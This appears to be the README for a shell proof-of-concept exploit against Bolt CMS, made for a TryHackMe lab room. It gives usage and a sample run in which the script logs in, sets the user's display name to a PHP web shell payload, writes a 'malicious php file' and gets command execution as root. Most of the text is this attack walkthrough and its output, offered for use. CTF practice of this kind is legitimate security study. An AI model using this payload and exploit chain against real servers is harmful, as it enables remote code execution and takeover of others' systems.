This was originally made for thm/bolt (https://tryhackme.com/room/bolt) room
because I couldn't find a working poc.
The python script on exploitdb was broken (no indentation, unnecessary stuff)
and the msfconsole one didn't work for me (broke the whole testing environment).

So I made this poc in sh with the use of curl, grep, awk, and sed.

usage:
poc.sh <URL> <USERNAME> <PASSWORD>

thm/bolt example:
$ sh poc.sh "http://10.10.69.113:8000" "bolt" "boltadmin123"
Grabbing login token and cookie
LOGIN_TOKEN=JR0y0yOVbDttsb55oyC0mGkKWNuhcq9fKcUgvPch8Wc BASE_COOKIE=bolt_session_9a4f708194bb25879310503ae8369e54=2940ad6e004611dfa50c190450
Logging in
Grabbing new cookies after login
Cookies: AUTH_COOKIE=bolt_authtoken_9a4f708194bb25879310503ae8369e54=e813d1d73a866132f161ebd4e228e2421f4d72dc02567154f18a9b7669d06e54, SESSION_COOKIE=bolt_session_9a4f708194bb25879310503ae8369e54=8a7844d25a388aab06e630bfb1
Changing profilename to <?php system($_GET["c"]);?>
CHANGE_TOKEN=RCJcAepZEUdNzc9D0PY9zJYdIVW1P5I4UFjYWqRBxgg
User's displayname changed
Grabbing CSRFTOKEN
CSRFTOKEN=oz6VIbDy8tC7BGG_s_O8alsgqQ854lEfAgqzUwyRoRc
Creating the malicious php file
Testing for command execution with uname -a
Linux bolt 4.15.0-111-generic #112-Ubuntu SMP Thu Jul 9 20:32:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
^C
